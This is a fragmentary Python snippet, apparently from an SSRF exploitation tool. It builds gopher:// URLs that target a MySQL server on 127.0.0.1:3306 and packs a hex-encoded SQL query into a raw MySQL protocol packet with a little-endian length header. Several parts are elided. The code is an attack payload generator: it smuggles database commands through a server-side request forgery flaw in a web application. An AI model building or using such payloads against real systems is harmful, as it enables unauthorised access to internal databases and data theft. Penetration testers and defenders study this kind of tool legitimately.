...
def MySQL():
    ...
    def encode(s):
        ...
        return "gopher://127.0.0.1:3306/_%25" + "%25".join(a)

    def get_payload(query):
        if query.strip() != '':
            query_hex = query.encode().hex()
            query_length = '{:06x}'.format((int((len(query_hex) / 2) + 1)))
            # Reverse the 3-byte little-endian length
            raw = bytes.fromhex(query_length)[::-1].hex()
            pay1 = raw + "0003" + query_hex
